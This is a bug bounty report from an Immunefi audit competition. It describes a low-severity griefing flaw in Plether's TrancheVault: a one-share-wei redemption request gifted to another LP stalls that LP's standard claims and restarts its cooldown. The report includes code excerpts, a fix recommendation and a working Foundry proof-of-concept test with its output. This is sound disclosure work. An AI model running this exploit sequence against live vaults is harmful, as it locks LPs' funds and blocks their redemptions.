# \#99476 [SC-Low] A one-wei redemption request gifted to another LP stalls that LP's standard claims and forces a cooldown restart to clear it

**Submitted on Nov 13th 2026 at 20:23:51 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99476
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
Any holder of one share-wei can open a redemption request in `TrancheVault` for another LP, naming that LP as `controller` without its consent. This breaks the protocol's own stated rule that share delivery "cannot impose another account's cooldown", which the LOW-40 fix was written to guarantee. In the PoC a gift worth 0 USDG atoms makes `redeem`/`withdraw` revert and `maxRedeem`/`maxWithdraw` return zero on the victim's funded 99,999.60 USDG redemption. The only way to clear the gift restarts the one-hour cooldown on the victim's 899,996 USDG wallet balance. The attacker can repeat it in the next quiet epoch.

## Vulnerability Details
`requestRedeem` checks only the caller's authority over the owner's shares. The `controller` is not asked (`TrancheVault.sol` L606-L632):

```solidity
_requireMinimumRedeemSize(shares, maxShares);
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);

requestId = _enqueueRedeemRequest(shares, controller); // <-@ any controller, no consent
```

Dust passes the size check when it is the owner's whole balance (L1611-L1618), so a wallet holding one share-wei can submit it:

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) { // <-@
    revert TrancheVault__WithdrawalTooSmall();
}
```

A one-wei request quotes to zero assets. When it is alone in its hourly epoch, settlement marks the epoch refundable (`HousePool.sol` L957-L987). The position then stays in the controller's redeem queue until the controller itself calls `claimRedeemRefund` (L916-L948). The standard claim functions read only the queue head (L998-L1012, L1299-L1311):

```solidity
function maxRedeem(
    address controller
) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller]; // <-@ the gifted request
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

Clearing the gifted request restarts the cooldown (L942-L945), and the receiver must be the controller:

```solidity
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp; // <-@
    _transfer(address(this), receiver, shares);
}
```

After that the victim's `requestRedeem` and share transfers revert for one hour (L617-L619, L325-L327). Cancelling the gift before settlement sets the same stamp (L911). The victim therefore has no way to clear a gifted request without the cooldown.

**Why this is not intended behaviour**
1. The vault's interface states why the receiver rule exists: "share delivery cannot impose another account's cooldown or depend on an unsolicited receiver balance" (`IAsyncTrancheVault.sol` L12-L14). Here a stranger imposes exactly that cooldown on another account. The same comment says request authorization follows ERC-7540 owner approval rules. Those rules protect the owner's shares. The harm here falls on the controller, whom no rule asks for consent.
2. The audit reply to LOW-40 states the intent: "A controller therefore cannot use these paths to send unsolicited shares and impose a cooldown on an unrelated empty address." That fix restricted who can receive a claim. It left open who can open a request for a controller, so a stranger now achieves the same result against a funded LP.
3. Every claim, cancellation and refund path requires the controller or its approved operator and delivers shares only to the controller (SECURITY.md L1403-L1404). The protocol treats the controller's consent as required wherever its shares or cooldown are touched.
4. The canonical integration guide tells LPs that funded requests are "claimed through ERC-4626 `redeem` or `withdraw`" (`CANONICAL_ENTRYPOINTS.md` L191-L192). Those are the exact functions the gift disables.
5. The minimum redemption size exists to stop dust requests. The gift bypasses it only through the whole-balance exemption, on a wallet created for the purpose.

## Impact Details
Griefing: a stranger, for one share-wei and gas and without consent, blocks any LP's standard redemption claims and forces a cooldown on that LP's wallet balance.

| Victim LP, same funded redemption | No gift (control) | With gifted one-wei request |
|---|---|---|
| `maxRedeem` / `maxWithdraw` | full funded amount | 0 |
| `redeem` / `withdraw` | pays 99,999.99 USDG | reverts |
| clearing the queue head | not needed | only via `claimRedeemRefund`, restarts the cooldown |
| `requestRedeem` and transfers afterwards | allowed | blocked for 1 hour on 899,996 USDG |
| attacker cost | - | 1 share-wei (0 USDG atoms) plus gas |

- An LP or integration that follows the canonical guide cannot claim its funded redemption while the gift sits at its queue head.
- Clearing the gift locks the victim's wallet balance for one hour: no new redemption request and no transfer, so the LP cannot exit while the pool's value moves.
- The attack repeats. Any later hourly epoch with no other redemption in that vault can carry a new gift for one more share-wei. The PoC places a second gift after the victim clears the first, and it becomes the victim's refundable head again. Both vaults share the code, so LPs of both tranches are exposed.

**Recommendation.** Require the controller's consent when `controller != owner` (`controller == msg.sender` or an approved operator), as the claim paths already do. Alternatively, do not restart the cooldown on a redemption refund or cancellation.

## References
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L987

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L948

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L7-L14

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1399-L1404

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L191-L192

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf


## Proof of Concept

## Proof of Concept
Check out the repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, save the file below as `packages/perps/test/poc/GiftedRedeemRequestCooldown.t.sol` and run:

`forge test --root packages/perps --match-path test/poc/GiftedRedeemRequestCooldown.t.sol -vv`

No fork or RPC is needed, and in-scope source is not modified.

In the attack test the attacker moves one share-wei to an empty wallet and calls `requestRedeem(1, VICTIM, wallet)`. After settlement the request is the victim's refundable redeem head. The victim's funded redemption cannot be claimed through `redeem`/`withdraw`, and `claimRedeemRefund` clears the head but restarts the cooldown. The control test claims the same redemption normally. The third test shows that dust is accepted only as a whole balance.

Output:
```text
Ran 3 tests for test/poc/GiftedRedeemRequestCooldown.t.sol:GiftedRedeemRequestCooldownTest
[PASS] test_Control_StandardClaimWorksAndNoCooldownIsRestarted() (gas: 906761)
Logs:
  CONTROL standard redeem paid (USDG atoms): 99999996123

[PASS] test_DustIsOnlyAcceptedAsAWholeBalance() (gas: 652151)
[PASS] test_GiftedDustRedeem_StallsStandardClaimsAndClearingItRestartsCooldown() (gas: 2246880)
Logs:
  victim balance locked by the restarted cooldown (USDG): 899996
  victim redemption stuck behind the gift on the standard surface (USDG atoms): 99999596930
  attacker spend per gift (share-wei / USDG atoms): 1 0

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished

Ran 1 test suite: 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

The 0.40 USDG difference between the two funded amounts is the Senior coupon accrued over the 30 days the attack test lets pass.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Anyone can name another LP as the controller of a redemption request (`requestRedeem(shares, controller,
///         owner)`), and the minimum-size rule exempts a request for the owner's whole balance. A one-wei request
///         that is alone in its hourly epoch cannot be funded, so settlement marks it refundable. It then sits at
///         the head of the victim controller's redeem queue: the standard `redeem` / `withdraw` / `maxRedeem` /
///         `maxWithdraw` of that controller stop at it, and the only way to clear it, `claimRedeemRefund`, restarts
///         the victim's one-hour cooldown on its whole balance.
contract GiftedRedeemRequestCooldownTest is BasePerpTest {

    address internal constant VICTIM = address(0x71C71);
    address internal constant OTHER_LP = address(0x07E4);
    address internal constant ATTACKER = address(0xA77AC);
    address internal constant DUST_WALLET = address(0xD057);
    address internal constant KEEPER = address(0x4EE9E7);
    address internal constant SEED = address(0x5EED);

    uint256 internal constant START = 1_793_707_200; // Tue 2026-11-03 12:00:00 UTC, live FX market
    uint256 internal constant PRICE = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return SEED;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SEED;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        vm.warp(START);
        _fundJunior(VICTIM, 1_000_000e6);
        _fundJunior(OTHER_LP, 1_000_000e6);
        _fundJunior(ATTACKER, 1_000e6);
        // Everybody's deposit cooldown has long expired.
        _go(vm.getBlockTimestamp() + 3 hours);
        _refresh();
    }

    /// Control: without the gift the victim's standard claim works and it can keep requesting and transferring.
    function test_Control_StandardClaimWorksAndNoCooldownIsRestarted() public {
        uint256 shares = juniorVault.balanceOf(VICTIM) / 10;
        uint256 stampBefore = juniorVault.lastDepositTime(VICTIM);
        vm.prank(VICTIM);
        uint256 ownId = juniorVault.requestRedeem(shares, VICTIM, VICTIM);
        _settleAt(ownId);

        assertEq(juniorVault.controllerRedeemHead(VICTIM), ownId, "the victim's own request is its redeem head");
        assertEq(juniorVault.maxRedeem(VICTIM), shares, "standard view shows the funded redemption");
        vm.prank(VICTIM);
        uint256 paid = juniorVault.redeem(shares, VICTIM, VICTIM);
        assertGt(paid, 99_000e6, "standard redeem pays");

        assertEq(juniorVault.lastDepositTime(VICTIM), stampBefore, "no cooldown restart");
        assertGt(juniorVault.maxRequestRedeem(VICTIM), 0, "victim can request again");
        vm.prank(VICTIM);
        juniorVault.transfer(OTHER_LP, 1e9);
        console2.log("CONTROL standard redeem paid (USDG atoms):", paid);
    }

    /// Attack: one share-wei gifted into the victim's request queue.
    function test_GiftedDustRedeem_StallsStandardClaimsAndClearingItRestartsCooldown() public {
        uint256 giftId = _gift();

        // Settlement cannot fund one share-wei, so the pool marks the epoch refundable.
        _settleAt(giftId);
        assertTrue(juniorVault.redeemRefundPending(giftId, VICTIM), "gift became a refundable position of the victim");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), giftId, "and it is the victim's redeem head");

        // Nobody but the victim (or its operator) can clear it, and it never clears by itself.
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(giftId, VICTIM, VICTIM);
        _go(vm.getBlockTimestamp() + 30 days);
        _refresh();
        assertEq(juniorVault.controllerRedeemHead(VICTIM), giftId, "still the head a month later");

        // The victim now redeems 10% of its position in the ordinary way; the epoch is funded in full.
        uint256 shares = juniorVault.balanceOf(VICTIM) / 10;
        vm.prank(VICTIM);
        uint256 ownId = juniorVault.requestRedeem(shares, VICTIM, VICTIM);
        _settleAt(ownId);
        uint256 funded = juniorVault.claimableRedeemAssets(ownId, VICTIM);
        assertGt(funded, 99_000e6, "victim's redemption is funded and waiting in escrow");

        // Standard ERC-4626 / ERC-7540 surface: stuck behind the gift.
        assertEq(juniorVault.maxRedeem(VICTIM), 0, "maxRedeem reports nothing");
        assertEq(juniorVault.maxWithdraw(VICTIM), 0, "maxWithdraw reports nothing");
        vm.prank(VICTIM);
        vm.expectRevert();
        juniorVault.redeem(shares, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert();
        juniorVault.withdraw(funded, VICTIM, VICTIM);

        // (a) The explicit-id claim is not blocked.
        uint256 snapshot = vm.snapshotState();
        vm.prank(VICTIM);
        assertEq(juniorVault.claimRedeem(ownId, shares, VICTIM, VICTIM), funded, "explicit-id claim still pays");
        assertTrue(vm.revertToState(snapshot));

        // Clearing the gift is the only way to free the standard surface, and it restarts the cooldown.
        uint256 stampBefore = juniorVault.lastDepositTime(VICTIM);
        vm.prank(VICTIM);
        uint256 refunded = juniorVault.claimRedeemRefund(giftId, VICTIM, VICTIM);
        assertEq(refunded, 1, "the victim receives the one share-wei");
        assertEq(juniorVault.lastDepositTime(VICTIM), vm.getBlockTimestamp(), "cooldown restarted now");
        assertGt(juniorVault.lastDepositTime(VICTIM), stampBefore + 30 days, "it had expired long ago");
        assertEq(juniorVault.maxRequestRedeem(VICTIM), 0, "whole balance locked");
        uint256 remaining = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(remaining, VICTIM, VICTIM);
        vm.prank(VICTIM);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(OTHER_LP, 1e9);

        // The standard claim works again.
        assertEq(juniorVault.maxRedeem(VICTIM), shares, "standard view recovered");
        vm.prank(VICTIM);
        assertEq(juniorVault.redeem(shares, VICTIM, VICTIM), funded, "standard redeem pays after clearing");

        // The attacker repeats it in the next quiet epoch.
        uint256 secondGift = _gift();
        _settleAt(secondGift);
        assertTrue(juniorVault.redeemRefundPending(secondGift, VICTIM), "second gift is refundable too");
        assertEq(juniorVault.controllerRedeemHead(VICTIM), secondGift, "and is the head again");

        console2.log("victim balance locked by the restarted cooldown (USDG):", juniorVault.convertToAssets(remaining) / 1e6);
        console2.log("victim redemption stuck behind the gift on the standard surface (USDG atoms):", funded);
        console2.log("attacker spend per gift (share-wei / USDG atoms):", uint256(1), juniorVault.convertToAssets(1));
    }

    /// The exemption that makes it free: dust is rejected unless it is the owner's whole balance.
    function test_DustIsOnlyAcceptedAsAWholeBalance() public {
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__WithdrawalTooSmall.selector);
        juniorVault.requestRedeem(1, VICTIM, ATTACKER);
        _gift(); // the same one share-wei from a wallet that holds nothing else is accepted
    }

    // ------------------------------------------------------------------------------------------------- helpers

    /// @dev The attacker moves one share-wei to an empty wallet and redeems that wallet's whole balance with the
    ///      victim as controller. No approval or action of the victim is involved.
    function _gift() internal returns (uint256 giftId) {
        vm.prank(ATTACKER);
        juniorVault.transfer(DUST_WALLET, 1);
        assertEq(juniorVault.balanceOf(DUST_WALLET), 1, "one share-wei");
        vm.prank(DUST_WALLET);
        giftId = juniorVault.requestRedeem(1, VICTIM, DUST_WALLET);
        (uint256 epochShares,,,,,,,,,) = juniorVault.redeemEpochs(giftId);
        assertEq(epochShares, 1, "the gift is alone in its epoch");
    }

    function _settleAt(uint256 epochId) internal {
        _go(pool.lpEpochStart(epochId) + 5);
        uint64 nowTs = uint64(vm.getBlockTimestamp());
        bytes[] memory data = _tick(nowTs, nowTs - 1);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _refresh() internal {
        _go(vm.getBlockTimestamp() + 1);
        uint64 nowTs = uint64(vm.getBlockTimestamp());
        bytes[] memory data = _tick(nowTs, nowTs - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _tick(uint64 publishTime, uint64 previousTime) internal returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        baseMockPyth.setAllPrices(ids, int64(uint64(PRICE)), int32(-8), publishTime);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(PRICE)), 0, int32(-8), publishTime, previousTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _go(uint256 timestamp) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

}
```
